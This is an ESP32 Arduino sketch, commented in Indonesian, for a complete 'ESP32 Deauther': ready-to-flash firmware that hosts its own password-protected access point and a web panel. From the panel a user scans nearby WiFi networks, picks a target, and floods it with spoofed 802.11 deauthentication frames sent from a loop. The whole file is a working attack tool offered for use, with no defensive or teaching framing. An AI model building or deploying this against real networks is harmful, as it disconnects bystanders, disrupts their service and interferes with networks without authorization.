#include <WiFi.h>
#include <esp_wifi.h>
#include <WebServer.h>

// ========== KONFIGURASI ==========
const char* ap_ssid = "GMpro";
const char* ap_password = "Sangkur87";

WebServer server(80);

bool attack = false;
uint8_t target_mac[6] = {0};
uint8_t target_ch = 1;
int packet_count = 0;

// ========== FRAME DEAUTH ==========
typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t dest[6];
  uint8_t src[6];
  uint8_t bssid[6];
  uint16_t seq_ctrl;
  uint8_t reason;
} __attribute__((packed)) deauth_frame;

// ========== KIRIM DEAUTH ==========
void send_deauth() {
  esp_wifi_set_channel(target_ch, WIFI_SECOND_CHAN_NONE);
  
  deauth_frame frame;
  frame.frame_ctrl = 0xC0;
  frame.duration = 0;
  memset(frame.dest, 0xFF, 6);
  memcpy(frame.src, target_mac, 6);
  memcpy(frame.bssid, target_mac, 6);
  frame.seq_ctrl = 0;
  frame.reason = 0x07;
  
  esp_wifi_80211_tx(WIFI_IF_AP, (uint8_t*)&frame, sizeof(frame), false);
  packet_count++;
  delay(1);
}

// ========== HALAMAN WEB ==========
const char html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>ESP32 Deauther</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    * { box-sizing: border-box; }
    body { font-family: Arial; background: #0a0a0a; color: white; padding: 20px; margin: 0; }
    .container { max-width: 700px; margin: auto; }
    .card { background: #1e1e1e; padding: 20px; margin: 15px 0; border-radius: 12px; }
    h1 { color: #e94560; margin: 0 0 10px; font-size: 24px; }
    h2 { font-size: 18px; margin: 0 0 15px; color: #ccc; }
    button { padding: 12px 24px; margin: 5px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
    .start { background: #e94560; color: white; }
    .stop { background: #dc3545; color: white; }
    .scan { background: #28a745; color: white; width: 100%; }
    select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; background: #2a2a2a; color: white; border: 1px solid #444; font-size: 14px; }
    .status-box { background: #2a2a2a; padding: 15px; border-radius: 8px; margin: 10px 0; text-align: center; }
    .running { background: #dc3545; color: white; padding: 10px; border-radius: 8px; font-weight: bold; }
    .stopped { background: #28a745; color: white; padding: 10px; border-radius: 8px; font-weight: bold; }
    .packet-count { font-size: 24px; font-weight: bold; margin-top: 10px; }
  </style>
</head>
<body>
<div class="container">
  <h1>ESP32 Deauther</h1>
  
  <div class="card">
    <h2>Status</h2>
    <div class="status-box">
      <div id="statusText" class="stopped">STOPPED</div>
      <div class="packet-count">Packets: <span id="packetCount">0</span></div>
    </div>
  </div>
  
  <div class="card">
    <h2>Target AP</h2>
    <button class="scan" onclick="scanNetworks()">SCAN WIFI</button>
    <select id="targetSelect">
      <option value="">-- Scan dulu --</option>
    </select>
  </div>
  
  <div class="card">
    <h2>Attack</h2>
    <button class="start" onclick="startAttack()">START DEAUTH</button>
    <button class="stop" onclick="stopAttack()">STOP ATTACK</button>
  </div>
</div>

<script>
function updateStatus() {
  fetch('/status')
    .then(res => res.json())
    .then(data => {
      const statusDiv = document.getElementById('statusText');
      if(data.running) {
        statusDiv.innerHTML = 'RUNNING';
        statusDiv.className = 'running';
      } else {
        statusDiv.innerHTML = 'STOPPED';
        statusDiv.className = 'stopped';
      }
      document.getElementById('packetCount').innerHTML = data.packets;
    })
    .catch(e => console.log('Error:', e));
}

function scanNetworks() {
  document.getElementById('targetSelect').innerHTML = '<option>Scanning...</option>';
  fetch('/scan')
    .then(res => res.json())
    .then(data => {
      let select = document.getElementById('targetSelect');
      select.innerHTML = '<option value="">-- Pilih Target --</option>';
      if(data.networks && data.networks.length > 0) {
        data.networks.forEach(net => {
          let option = document.createElement('option');
          option.value = net.bssid + ',' + net.channel;
          option.innerHTML = (net.ssid || '(Hidden)') + ' [CH' + net.channel + '] ' + net.bssid;
          select.appendChild(option);
        });
      } else {
        select.innerHTML = '<option value="">Tidak ada jaringan</option>';
      }
    })
    .catch(e => {
      document.getElementById('targetSelect').innerHTML = '<option value="">Gagal scan</option>';
    });
}

function startAttack() {
  let select = document.getElementById('targetSelect');
  let val = select.value;
  if(!val || val === '') {
    alert('Scan dulu dan pilih target AP!');
    return;
  }
  fetch('/start', {
    method: 'POST',
    body: val
  }).then(() => {
    alert('Attack started!');
    updateStatus();
  });
}

function stopAttack() {
  fetch('/stop', { method: 'POST' })
    .then(() => {
      alert('Attack stopped!');
      updateStatus();
    });
}

setInterval(updateStatus, 1000);
updateStatus();
</script>
</body>
</html>
)rawliteral";

// ========== SETUP ==========
void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("======================================");
  Serial.println("ESP32 Deauther Starting...");
  Serial.println("======================================");
  
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ap_ssid, ap_password);
  
  Serial.print("AP SSID: ");
  Serial.println(ap_ssid);
  Serial.print("AP Password: ");
  Serial.println(ap_password);
  Serial.print("AP IP Address: ");
  Serial.println(WiFi.softAPIP());
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
  
  server.on("/", []() {
    server.send(200, "text/html", html);
  });
  
  server.on("/status", []() {
    String json = "{\"running\":" + String(attack ? "true" : "false") + ",\"packets\":" + packet_count + "}";
    server.send(200, "application/json", json);
  });
  
  server.on("/scan", []() {
    int n = WiFi.scanNetworks();
    String json = "{\"networks\":[";
    for(int i = 0; i < n; i++) {
      if(i > 0) json += ",";
      json += "{\"ssid\":\"" + WiFi.SSID(i) + "\",";
      json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
      json += "\"channel\":" + String(WiFi.channel(i)) + ",";
      json += "\"rssi\":" + String(WiFi.RSSI(i)) + "}";
    }
    json += "]}";
    WiFi.scanDelete();
    server.send(200, "application/json", json);
  });
  
  server.on("/start", HTTP_POST, []() {
    if(server.hasArg("plain")) {
      String data = server.arg("plain");
      int comma = data.indexOf(',');
      if(comma > 0) {
        String mac = data.substring(0, comma);
        String ch = data.substring(comma + 1);
        target_ch = ch.toInt();
        
        sscanf(mac.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
          &target_mac[0], &target_mac[1], &target_mac[2],
          &target_mac[3], &target_mac[4], &target_mac[5]);
        
        attack = true;
        packet_count = 0;
        
        Serial.println("Attack started!");
        Serial.print("Target MAC: ");
        Serial.println(mac);
        Serial.print("Channel: ");
        Serial.println(target_ch);
      }
    }
    server.send(200, "text/plain", "OK");
  });
  
  server.on("/stop", HTTP_POST, []() {
    attack = false;
    Serial.println("Attack stopped!");
    server.send(200, "text/plain", "OK");
  });
  
  server.begin();
  
  Serial.println("Web server started!");
  Serial.println("======================================");
  Serial.print("Connect to WiFi: ");
  Serial.println(ap_ssid);
  Serial.print("Password: ");
  Serial.println(ap_password);
  Serial.println("Open browser: http://192.168.4.1");
  Serial.println("======================================");
}

// ========== LOOP ==========
void loop() {
  server.handleClient();
  
  if(attack) {
    send_deauth();
    delay(50);
  }
  
  delay(10);
}
